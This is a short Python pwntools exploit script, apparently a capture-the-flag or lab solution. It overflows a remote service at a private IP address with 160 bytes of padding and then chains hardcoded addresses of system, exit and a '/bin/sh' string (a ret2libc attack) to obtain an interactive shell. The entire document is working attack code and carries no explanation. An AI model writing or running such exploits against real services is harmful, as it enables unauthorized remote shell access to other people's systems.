from pwn import *

junk = "A" * 160
system = 0xf7e26e10
exit = 0xf7e1a060
bin = 0xf7f6588f


p = remote("192.168.2.83", "1113")

in_str =  junk + p32(system) + p32(exit) + p32(bin)

p.sendline(in_str)
p.interactive()